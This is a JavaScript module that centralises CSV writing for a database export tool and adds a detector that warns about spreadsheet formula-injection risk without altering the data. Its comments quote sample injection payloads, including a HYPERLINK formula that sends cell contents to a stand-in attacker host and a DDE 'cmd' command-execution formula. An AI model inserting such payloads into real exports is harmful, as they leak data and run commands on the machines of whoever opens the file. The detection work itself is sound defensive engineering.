/**
 * CSV serialisation, in one place.
 *
 * There were THREE independent CSV writers in this codebase for one format:
 * `StreamingHandler.batchToCsv` (streaming export), `DatabaseTools.recordsetToCsv`
 * (non-streaming export) and `BaseToolHandler.formatAsCsv` (the `formatResults(result, 'csv')`
 * path). Only the middle one was correct. The streaming writer terminated rows with `'\\n'` - a
 * TWO-CHARACTER string in JavaScript, backslash and n, not a newline - so every streamed export
 * was one unparseable line, and `formatAsCsv` quoted on comma and double quote only, leaving a
 * value containing CR or LF to break the record and header names unescaped entirely. A
 * one-character defect survived a year because the path most exercised by tests and small
 * exports was the correct one. All three now call these helpers.
 *
 * Records are terminated with LF, not the CRLF of RFC 4180's grammar. That is deliberate: it
 * matches the writer here that was already correct, keeps stray `\r` out of MCP text responses,
 * and is accepted by every mainstream reader including Excel. The RFC's FIELD rules - when to
 * quote, and doubling embedded quotes - are followed exactly, and those are what decide whether
 * a file parses at all.
 */

/** Row terminator. A real newline; readers accept LF, CRLF and CR. */
export const CSV_ROW_TERMINATOR = '\n';

/**
 * RFC 4180: a field must be quoted if it contains the delimiter, a double quote, or a line
 * break. CR is included as well as LF - a lone CR inside an unquoted field breaks the row
 * for any reader that treats CR as a terminator.
 */
const MUST_QUOTE = /[",\r\n]/;

/**
 * One CSV cell: null and undefined become empty, and a value needing quotes gets them with
 * its own double quotes doubled.
 * @param {*} value - Cell value
 * @returns {string} The serialised cell
 */
export function csvEscapeCell(value) {
  if (value === null || value === undefined) return '';

  const stringValue = String(value);
  if (MUST_QUOTE.test(stringValue)) {
    return `"${stringValue.replace(/"/g, '""')}"`;
  }
  return stringValue;
}

/**
 * One CSV record, terminator included.
 * @param {Array<*>} cells - Cell values in column order
 * @returns {string} The serialised row
 */
export function csvRow(cells) {
  return cells.map(csvEscapeCell).join(',') + CSV_ROW_TERMINATOR;
}

/**
 * Control characters a spreadsheet reader may strip from the front of a cell before deciding
 * what the cell is. TAB (0x09), CR (0x0D) and LF (0x0A) are the set OWASP names, and they
 * matter here only as a WRAPPER: `\t=1+1` is dangerous because the reader discards the tab and
 * is left with a formula, while `\tHello` is just text with a tab on it. Treating them as
 * triggers in their own right flags the second case too, which is noise - and noise is what
 * teaches a reader to ignore the warning.
 *
 * They also have to be stripped rather than merely listed, because the wrapper is what evades
 * a naive `^[=+\-@]` filter. Note LF is only reachable inside a quoted field, and quoting is
 * not a mitigation: the reader strips the quotes and evaluates what was inside.
 */
const LEADING_CONTROL = /^[\t\r\n]+/;

/**
 * Leading characters that make a spreadsheet treat a cell as a formula rather than data.
 * Excel, LibreOffice Calc and Google Sheets all evaluate `=`, `+`, `-` and `@`. A value such as
 * `=HYPERLINK("http://attacker/?"&A1)` or `=cmd|'/c calc'!A1` sitting in an ordinary column
 * becomes executable the moment someone opens the export - the database value never has to be
 * malicious, only rendered.
 *
 * This is orthogonal to the quoting above. Quoting satisfies RFC 4180; the reader still strips
 * the quotes and evaluates what is inside. A leading TAB is not even quoted here, since
 * MUST_QUOTE does not include it.
 */
const FORMULA_TRIGGER = /^[=+\-@]/;

/**
 * A strict numeric literal, which a spreadsheet parses as a number and never as an expression.
 *
 * This exemption is not an optimisation - it is what keeps the check usable. `mssql` returns
 * INT and DECIMAL columns as JS numbers, so `String(-1)` is `'-1'` and a bare /^[=+\-@]/ test
 * flags every negative number in the export. On a financial, variance or temperature column
 * that is most of the data, and an alarm that fires on ordinary figures is one its reader
 * learns to ignore.
 *
 * The exemption is sound because no string is both a valid numeric literal and a formula:
 * `-1` and `-1.5e3` are exempt, while `-1+1` and `-1+cmd|'/c calc'!A1` are not.
 */
const NUMERIC_LITERAL = /^-?\d+(\.\d+)?([eE][+-]?\d+)?$/;

/**
 * Whether a spreadsheet would evaluate a cell value as a formula.
 *
 * This is a detector, not a sanitiser. Nothing in this module rewrites values: an export that
 * quietly turned `-1` into `'-1` would be lying about the data, and for a pipeline, another
 * database or `pandas.read_csv` the mitigation would be the bug. Callers use this to WARN about
 * what they are handing over, leaving the bytes exactly as the database returned them.
 *
 * @param {*} value - Cell value
 * @returns {boolean} True if a spreadsheet would treat the value as a formula
 */
export function isFormulaRisky(value) {
  if (value === null || value === undefined) return false;

  // What the reader is left holding once it has discarded the leading control characters.
  // Both tests run against that, not the raw value: `\t=1+1` is a formula and `\t-1` is still
  // just a number.
  const unwrapped = String(value).replace(LEADING_CONTROL, '');
  return FORMULA_TRIGGER.test(unwrapped) && !NUMERIC_LITERAL.test(unwrapped);
}

/**
 * Counts the cells in a batch of row objects a spreadsheet would evaluate as formulas.
 *
 * @param {Array<object>} rows - Row objects, as returned by mssql
 * @param {boolean} [includeHeaders] - Also check the column names, which are written through
 *   the same `csvRow` helper and are evaluated just like a data cell
 * @returns {number} How many cells are formula-risky
 */
export function countFormulaRiskyCells(rows, includeHeaders = false) {
  if (!Array.isArray(rows) || rows.length === 0) return 0;

  let count = 0;

  if (includeHeaders) {
    for (const header of Object.keys(rows[0])) {
      if (isFormulaRisky(header)) count++;
    }
  }

  for (const row of rows) {
    for (const value of Object.values(row)) {
      if (isFormulaRisky(value)) count++;
    }
  }

  return count;
}
